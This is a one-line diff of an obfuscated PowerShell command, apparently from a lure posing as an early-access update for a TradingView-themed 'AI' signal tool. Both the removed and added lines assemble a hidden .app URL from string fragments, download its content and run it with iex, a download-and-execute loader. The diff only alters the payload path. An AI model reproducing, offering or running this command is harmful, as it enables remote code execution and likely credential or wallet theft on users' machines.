@@ -1,1 +1,1 @@
-powershell -Command "$update='betasignal'; $mode='tradingview'; $key='ai'; $file='earlyaccess'; $url=$update+$mode+$key+'.app/update/'+$file; &{ iex ([System.Text.Encoding]::UTF8.GetString((iwr $url -UseBasicParsing).Content)) }"
+powershell -Command "$update='betasignal'; $mode='tradingview'; $key='ai'; $file='userearlyaccess'; $url=$update+$mode+$key+'.app/update/'+$file; &{ iex ([System.Text.Encoding]::UTF8.GetString((iwr $url -UseBasicParsing).Content)) }"
